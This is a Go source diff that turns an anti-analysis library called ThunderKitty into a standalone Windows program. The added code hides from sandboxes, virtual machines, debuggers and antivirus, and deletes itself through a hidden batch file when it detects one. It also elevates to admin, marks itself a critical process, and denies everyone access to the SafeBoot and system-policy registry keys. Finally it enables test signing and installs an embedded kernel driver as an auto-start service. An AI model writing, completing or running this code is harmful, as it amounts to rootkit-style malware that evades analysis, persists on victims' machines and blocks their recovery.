@@ -1,8 +1,17 @@
-package AntiDebugVMAnalysis
+package main
 
 import (
+	_ "embed"
+	"fmt"
 	"log"
 	"os"
+	"os/exec"
+	"path/filepath"
+	"syscall"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/registry"
 
 	// AntiDebug
 	"anti_analysis/AntiDebug/CheckBlacklistedWindowsNames"
@@ -15,6 +24,7 @@ import (
 	"anti_analysis/AntiDebug/pcuptime"
 
 	// AntiVirtualization
+	SecureBootCheck "anti_analysis/AntiAntiRootkit/IsSecureBoot"
 	"anti_analysis/AntiVirtualization/AnyRunDetection"
 	"anti_analysis/AntiVirtualization/CleanEnvironmentDetection"
 	"anti_analysis/AntiVirtualization/ComodoAntivirusDetection"
@@ -35,169 +45,321 @@ import (
 	VMPlatformCheck "anti_analysis/AntiVirtualization/VMPlatformDetection"
 	"anti_analysis/AntiVirtualization/VMWareDetection"
 	"anti_analysis/AntiVirtualization/VirtualboxDetection"
+
+	// ProcessUtils
+	AdminCheck "anti_analysis/ProcessUtils/AdminChecks"
+	"anti_analysis/ProcessUtils/CriticalProcess"
 )
+
+//go:embed tulp.sys
+var tulpDriver []byte
+
+const CREATE_NO_WINDOW = 0x08000000
+
+// SelfDelete schedules the deletion of the running executable.
+func SelfDelete() {
+	exePath, err := os.Executable()
+	if err != nil {
+		return
+	}
+
+	exePathQuoted := `"` + exePath + `"`
+
+	// Create a temporary batch file that deletes the executable
+	batFile := exePath + ".del.bat"
+	batContent := fmt.Sprintf(`
+@echo off
+:Repeat
+del %s >nul 2>&1
+if exist %s goto Repeat
+del "%%~f0"
+`,
+		exePathQuoted,
+		exePathQuoted)
+
+	_ = os.WriteFile(batFile, []byte(batContent), 0644)
+
+	// Run the batch file in a new cmd process
+	cmd := exec.Command("cmd", "/C", "start", "", "/min", batFile)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	_ = cmd.Start()
+
+	// Exit immediately so the file can be deleted
+	os.Exit(0)
+}
 
 func ThunderKitty() {
 	// Directory creation check
 	if success := CyberCapture.CreateDirectory(); !success {
-		log.Println("[DEBUG] Avast/AVG CyberCapture detected.")
-		os.Exit(-1)
+		SelfDelete()
 	}
 
-	// lets just catch bunch of vms at beginning lol
-	if usbPluggedIn, err := USBCheck.PluggedIn(); err != nil {
-		os.Exit(-1)
-	} else if usbPluggedIn {
-		log.Println("[DEBUG] USB devices have been plugged in, check passed.")
-	} else {
-		os.Exit(-1)
+	// USB must be plugged in
+	if ok, err := USBCheck.PluggedIn(); err != nil || !ok {
+		SelfDelete()
 	}
+
 	if blacklistedUsernameDetected := UsernameCheck.CheckForBlacklistedNames(); blacklistedUsernameDetected {
-		log.Println("[DEBUG] Blacklisted username detected")
-		os.Exit(-1)
+		SelfDelete()
 	}
+
+	// Blacklisted Windows account names, uuids, processes etc.
+	if CheckBlacklistedWindowsNames.CheckBlacklistedWindows() {
+		SelfDelete()
+	}
+
 	// Run the built-in hook checks.
 	if HooksDetection.DetectHooksOnCommonWinAPIFunctions("", nil) {
-		log.Println("[DEBUG] UserAntiAntiDebug detected")
-		os.Exit(-1)
+		// Exit immediately if any hook is detected.
+		SelfDelete()
 	}
 
 	found, err := PowerShellCheck.RunPowerShellCommand(`"PowerShell is working: " + (Get-Date).ToShortTimeString()`)
 	if err != nil {
 		// Exit immediately on error
-		log.Printf("[DEBUG] PowerShell check failed: %v", err)
-		os.Exit(-1)
+		SelfDelete()
 	}
 	if found != "" {
 		// Service exists, continue with your logic
 	} else {
-		log.Println("[DEBUG] PowerShell returned empty result")
-		os.Exit(-1)
+		SelfDelete()
 	}
 
-	// AntiVirtualization checks
-	if vmwareDetected, _ := VMWareDetection.GraphicsCardCheck(); vmwareDetected {
-		log.Println("[DEBUG] VMWare detected")
-		os.Exit(-1)
+	// Indicates if the environment is suitable for rootkit and bootkit checks
+	if SecureBootCheck.IsSecureBootEnabled() {
+		SelfDelete()
 	}
 
-	if virtualboxDetected, _ := VirtualboxDetection.GraphicsCardCheck(); virtualboxDetected {
-		log.Println("[DEBUG] Virtualbox detected")
-		os.Exit(-1)
+	// Virtualization checks
+	if detected, _ := VMWareDetection.GraphicsCardCheck(); detected {
+		SelfDelete()
 	}
-
-	if kvmDetected, _ := KVMCheck.CheckForKVM(); kvmDetected {
-		log.Println("[DEBUG] KVM detected")
-		os.Exit(-1)
+	if detected, _ := VirtualboxDetection.GraphicsCardCheck(); detected {
+		SelfDelete()
 	}
-
-	if triageDetected, _ := TriageDetection.TriageCheck(); triageDetected {
-		log.Println("[DEBUG] Triage detected")
-		os.Exit(-1)
+	if detected, _ := KVMCheck.CheckForKVM(); detected {
+		SelfDelete()
 	}
-
-	// Check if the AnyRun environment is detected
+	if detected, _ := TriageDetection.TriageCheck(); detected {
+		SelfDelete()
+	}
 	if anyRunDetected, _ := AnyRunDetection.AnyRunDetection(); anyRunDetected {
-		log.Println("[DEBUG] AnyRun detected")
-		os.Exit(-1) // Exit the program with an error code
+		SelfDelete()
+	}
+	if small, _ := MonitorMetrics.IsScreenSmall(); small {
+		SelfDelete()
+	}
+	if detected := VMArtifacts.VMArtifactsDetect(); detected {
+		SelfDelete()
+	}
+	if detected, _ := RepetitiveProcess.Check(); detected {
+		SelfDelete()
+	}
+	if detected, _ := ParallelsCheck.CheckForParallels(); detected {
+		SelfDelete()
+	}
+	if detected, _ := HyperVCheck.DetectHyperV(); detected {
+		SelfDelete()
+	}
+	if detected, _ := VMPlatformCheck.DetectVMPlatform(); detected {
+		SelfDelete()
+	}
+	if detected := ComodoAntivirusDetection.DetectComodoAntivirus(); detected {
+		SelfDelete()
+	}
+	if detected := ShadowDefenderDetection.DetectShadowDefender(); detected {
+		SelfDelete()
+	}
+	if detected := SandboxieDetection.DetectSandboxie(); detected {
+		SelfDelete()
+	}
+	if detected := DeepFreezeDetection.DetectDeepFreeze(); detected {
+		SelfDelete()
+	}
+	if detected := CleanEnvironmentDetection.DetectCleanEnvironment(); detected {
+		SelfDelete()
 	}
 
-	if isScreenSmall, _ := MonitorMetrics.IsScreenSmall(); isScreenSmall {
-		log.Println("[DEBUG] Screen size is small")
-		os.Exit(-1)
+	// Debugger checks
+	if IsDebuggerPresent.IsDebuggerPresent1() {
+		SelfDelete()
 	}
-	if VMArtifacts := VMArtifacts.VMArtifactsDetect(); VMArtifacts {
-		log.Println("[DEBUG] VMArtifacts components detected. Exiting.")
-		os.Exit(-1)
-	}
-
-	if repetitiveproc, _ := RepetitiveProcess.Check(); repetitiveproc {
-		log.Println("[DEBUG] RepetitiveProcess detected. Exiting")
-		os.Exit(-1)
+	if detected, _ := RemoteDebugger.RemoteDebugger(); detected {
+		SelfDelete()
 	}
 
-	if pararelcheck, _ := ParallelsCheck.CheckForParallels(); pararelcheck {
-		log.Println("[DEBUG] Parallels detected. Exiting")
-		os.Exit(-1)
+	// Internet connectivity
+	if ok, _ := InternetCheck.CheckConnection(); !ok {
+		SelfDelete()
 	}
 
-	// Hyper-V detection
-	if hypervDetected, _ := HyperVCheck.DetectHyperV(); hypervDetected {
-		log.Println("[DEBUG] Hyper-V detected")
-		os.Exit(-1)
+	// Parent process anti-debug
+	if ParentAntiDebug.ParentAntiDebug() {
+		SelfDelete()
 	}
 
-	// VMPlatform detection
-	if vmPlatformDetected, _ := VMPlatformCheck.DetectVMPlatform(); vmPlatformDetected {
-		log.Println("[DEBUG] VM Platform detected")
-		os.Exit(-1)
+	// Running processes count
+	if detected, _ := RunningProcesses.CheckRunningProcessesCount(50); detected {
+		SelfDelete()
 	}
 
-	// Comodo Antivirus detection
-	if comodoDetected := ComodoAntivirusDetection.DetectComodoAntivirus(); comodoDetected {
-		log.Println("[DEBUG] Comodo Antivirus detected")
-		os.Exit(-1)
+	// Uptime check
+	if detected, _ := pcuptime.CheckUptime(1200); detected {
+		SelfDelete()
+	}
+}
+
+var (
+	modadvapi32         = windows.NewLazySystemDLL("advapi32.dll")
+	procSetEntriesInAcl = modadvapi32.NewProc("SetEntriesInAclW")
+)
+
+// setEntriesInAcl calls the Windows API SetEntriesInAclW function.
+func setEntriesInAcl(count uint32, pEntries *windows.EXPLICIT_ACCESS, oldAcl *windows.ACL, newAcl **windows.ACL) error {
+	r1, _, err := procSetEntriesInAcl.Call(
+		uintptr(count),
+		uintptr(unsafe.Pointer(pEntries)),
+		uintptr(unsafe.Pointer(oldAcl)),
+		uintptr(unsafe.Pointer(newAcl)),
+	)
+	if r1 != 0 {
+		return err
+	}
+	return nil
+}
+
+// lockRegistryKey denies full access to "Everyone" for the specified registry key path.
+func lockRegistryKey(path string) {
+	// Open registry key with permissions to read control info and modify DACL.
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, path, windows.READ_CONTROL|windows.WRITE_DAC)
+	if err != nil {
+		// silently ignore errors
+		return
+	}
+	defer key.Close()
+
+	hKey := windows.Handle(key)
+
+	// Retrieve current security info to comply with API usage (can be omitted if unused).
+	_, err = windows.GetSecurityInfo(
+		hKey,
+		windows.SE_REGISTRY_KEY,
+		windows.DACL_SECURITY_INFORMATION,
+	)
+	if err != nil {
+		return
 	}
 
-	// Shadow Defender detection
-	if shadowDefenderDetected := ShadowDefenderDetection.DetectShadowDefender(); shadowDefenderDetected {
-		log.Println("[DEBUG] Shadow Defender detected")
-		os.Exit(-1)
+	// Create a SID representing the "Everyone" group.
+	everyoneSid, err := windows.CreateWellKnownSid(windows.WinWorldSid)
+	if err != nil {
+		return
 	}
 
-	// Sandboxie detection
-	if sandboxieDetected := SandboxieDetection.DetectSandboxie(); sandboxieDetected {
-		log.Println("[DEBUG] Sandboxie detected")
-		os.Exit(-1)
+	// Define explicit access rule denying all access to Everyone.
+	ea := windows.EXPLICIT_ACCESS{
+		AccessPermissions: windows.KEY_ALL_ACCESS,
+		AccessMode:        windows.DENY_ACCESS,
+		Inheritance:       windows.NO_INHERITANCE,
+		Trustee: windows.TRUSTEE{
+			MultipleTrustee:          nil,
+			MultipleTrusteeOperation: windows.NO_MULTIPLE_TRUSTEE,
+			TrusteeForm:              windows.TRUSTEE_IS_SID,
+			TrusteeType:              windows.TRUSTEE_IS_WELL_KNOWN_GROUP,
+			TrusteeValue:             windows.TrusteeValue(uintptr(unsafe.Pointer(everyoneSid))),
+		},
 	}
 
-	// Deep Freeze detection
-	if deepFreezeDetected := DeepFreezeDetection.DetectDeepFreeze(); deepFreezeDetected {
-		log.Println("[DEBUG] Deep Freeze detected")
-		os.Exit(-1)
+	var newDACL *windows.ACL
+	err = setEntriesInAcl(1, &ea, nil, &newDACL)
+	if err != nil {
+		return
 	}
 
-	// Clean Environment detection
-	if cleanEnvironmentDetected := CleanEnvironmentDetection.DetectCleanEnvironment(); cleanEnvironmentDetected {
-		log.Println("[DEBUG] Clean Environment detected")
-		os.Exit(-1)
+	// Apply the new DACL to the registry key.
+	err = windows.SetSecurityInfo(
+		hKey,
+		windows.SE_REGISTRY_KEY,
+		windows.DACL_SECURITY_INFORMATION,
+		nil, nil,
+		newDACL,
+		nil,
+	)
+	if err != nil {
+		return
+	}
+}
+
+// extractAndSetupDriver extracts the embedded driver, enables test signing, and creates the necessary services.
+func extractAndSetupDriver() error {
+	// For safety, we extract to the temp directory instead of C:\
+	tempDir := os.TempDir()
+	driverPath := filepath.Join(tempDir, "tulp.sys")
+
+	// Extract the driver
+	err := os.WriteFile(driverPath, tulpDriver, 0644)
+	if err != nil {
+		return fmt.Errorf("failed to extract driver: %w", err)
+	}
+	log.Printf("[INFO] Driver extracted to %s", driverPath)
+
+	// Command to enable test signing
+	log.Println("[INFO] Enabling test signing...")
+	cmdTestSign := exec.Command("bcdedit", "/set", "testsigning", "on")
+	if output, err := cmdTestSign.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to enable test signing: %w - %s", err, string(output))
+	}
+	log.Println("[INFO] Test signing enabled successfully.")
+
+	// Command to create the kernel service
+	// Using the \??\ prefix for the path
+	ntDriverPath := `\??\` + driverPath
+	log.Printf("[INFO] Creating 'tulp' kernel service for driver: %s", ntDriverPath)
+	cmdScTulp := exec.Command("sc", "create", "tulp", "type=", "kernel", "start=", "auto", "binPath=", ntDriverPath)
+	if output, err := cmdScTulp.CombinedOutput(); err != nil {
+		// It might fail if the service already exists, we can try to delete it first
+		log.Printf("[WARN] Failed to create 'tulp' service, maybe it exists? Trying to delete and recreate. Error: %s", string(output))
+		exec.Command("sc", "delete", "tulp").Run()
+		if output, err := cmdScTulp.CombinedOutput(); err != nil {
+			return fmt.Errorf("failed to create 'tulp' service after delete attempt: %w - %s", err, string(output))
+		}
+	}
+	log.Println("[INFO] 'tulp' service created successfully.")
+
+	return nil
+}
+
+func main() {
+	// 1. Check for Admin privileges, elevate if necessary.
+	if !AdminCheck.IsAdmin() {
+		log.Println("[INFO] Not running as admin, attempting to elevate.")
+		AdminCheck.ElevateProcess()
+		os.Exit(0) // Exit the non-elevated process
+	}
+	log.Println("[INFO] Running with administrator privileges.")
+
+	// 2. Set the process as critical.
+	if err := CriticalProcess.SetProcessCritical(); err != nil {
+		log.Printf("[WARN] Failed to set process as critical: %v. Continuing...", err)
+	} else {
+		log.Println("[INFO] Process successfully marked as critical.")
 	}
 
-	// Blacklisted Windows account names, UUIDs, processes etc.
-	if CheckBlacklistedWindowsNames.CheckBlacklistedWindows() {
-		log.Println("[DEBUG] Blacklisted Windows name or process detected")
-		os.Exit(-1)
-	}
+	// 3. Run initial anti-analysis checks.
+	log.Println("[INFO] Running ThunderKitty anti-analysis suite...")
+	ThunderKitty()
+	log.Println("[INFO] ThunderKitty checks passed.")
 
-	// Other AntiDebug checks
-	if isDebuggerPresentResult := IsDebuggerPresent.IsDebuggerPresent1(); isDebuggerPresentResult {
-		log.Println("[DEBUG] Debugger presence detected")
-		os.Exit(-1)
-	}
+	// 4. Lock registry keys.
+	log.Println("[INFO] Locking registry keys...")
+	lockRegistryKey(`SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`)
+	lockRegistryKey(`SYSTEM\CurrentControlSet\Control\SafeBoot`)
+	log.Println("[INFO] Registry keys locked.")
 
-	if remoteDebuggerDetected, _ := RemoteDebugger.RemoteDebugger(); remoteDebuggerDetected {
-		log.Println("[DEBUG] Remote debugger detected")
-		os.Exit(-1)
+	// 5. Extract driver and set up services.
+	log.Println("[INFO] Starting driver extraction and system setup...")
+	if err := extractAndSetupDriver(); err != nil {
+		log.Fatalf("[FATAL] Failed to setup driver and services: %v", err)
 	}
-
-	if connected, _ := InternetCheck.CheckConnection(); !connected {
-		log.Println("[DEBUG] Internet connection check failed")
-		os.Exit(-1)
-	}
-
-	if parentAntiDebugResult := ParentAntiDebug.ParentAntiDebug(); parentAntiDebugResult {
-		log.Println("[DEBUG] ParentAntiDebug check failed")
-		os.Exit(-1)
-	}
-
-	if runningProcessesCountDetected, _ := RunningProcesses.CheckRunningProcessesCount(50); runningProcessesCountDetected {
-		log.Println("[DEBUG] Running processes count detected")
-		os.Exit(-1)
-	}
-
-	if pcUptimeDetected, _ := pcuptime.CheckUptime(1200); pcUptimeDetected {
-		log.Println("[DEBUG] PC uptime detected")
-		os.Exit(-1)
-	}
-
+	log.Println("[SUCCESS] All operations completed successfully.")
 }
